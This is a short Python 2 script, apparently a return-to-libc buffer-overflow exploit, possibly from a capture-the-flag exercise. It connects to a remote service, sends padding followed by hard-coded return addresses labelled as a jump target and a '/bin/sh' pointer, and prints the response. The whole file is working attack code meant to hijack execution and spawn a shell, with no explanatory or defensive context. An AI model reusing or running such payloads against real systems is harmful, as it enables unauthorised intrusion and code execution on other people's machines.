import struct, socket

s = socket.socket()
s.connect((Host, Port))
exv = struct.pack("<I",0x08048c0c)
binsh = struct.pack("<I",0xb7fd9647)
pattern = "\x90" * 510 + "\x00" + "\x90" * 22 
exploit =  pattern + exv + "BBBB" + binsh + "\00" * 8
s.send(exploit)
print s.recv(1024)

s.close()

